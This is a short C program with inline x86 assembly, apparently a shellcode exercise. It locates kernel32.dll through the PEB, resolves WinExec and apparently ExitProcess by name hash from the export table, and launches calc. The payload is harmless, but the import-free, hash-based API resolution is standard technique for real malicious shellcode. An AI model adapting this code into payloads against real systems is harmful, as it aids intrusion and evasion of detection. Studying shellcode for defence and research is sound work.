#include <stdio.h>
#include <Windows.h>

int main(void)
{
	printf("shellcode");
  
	__asm {
		jmp start
      
	find_addr:
		xor ecx, ecx
		dec ecx
      
	get_name:
		inc ecx
		xor edx, edx
		mov esi, [esp+0x8]
		lea esi, [esi+ecx*4]
		lodsd
		add eax, [esp+0x18]
		mov esi, eax
      
	loop_hash:
		mov eax, esi
		xor eax, eax
		lodsb
		add edx, eax
		test al, al
		jnz loop_hash
		cmp edx, [esp+0x4]
		jne get_name
		mov edi, [esp+0xc]
		xor edx, edx
		mov dx, [edi+ecx*2]
		mov esi, [esp+0x1c]
		mov esi, [esi+edx*4]
		add esi, [esp+0x18]
		mov eax, esi
		ret
      
	start:
		xor edx, edx
		mov dl, 0x30
		mov eax, fs:[edx]
		mov eax, [eax+0xc]
		mov eax, [eax+0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov ebx, [eax+0x10] //kernel32.dll base

		mov edx, ebx
		add dx, 0x168
		mov ecx, [edx] 
		add ecx, ebx //IMAGE_OPTIONAL_HEADER

		mov edx, [ecx+0x1c]
		add edx, ebx //Address Table
		mov edi, [ecx+0x20]
		add edi, ebx //Name Pointer Table
		mov esi, [ecx+0x24]
		add esi, ebx //Ordinal Table
		pushad
		xor edi, edi
		mov di, 0x2b3 //WinExec hash
		push edi
		call find_addr
		mov edi, 0x636c6163
		push edi
		xor edx, edx
		mov [esp+0x4], edx
		push esp
		call eax

		add sp, 4
		popad
		pushad
		xor edi, edi
		mov di, 0x479
		push edi
		call find_addr
		xor edx, edx
		push edx
		call eax
	}

	return 0;
}
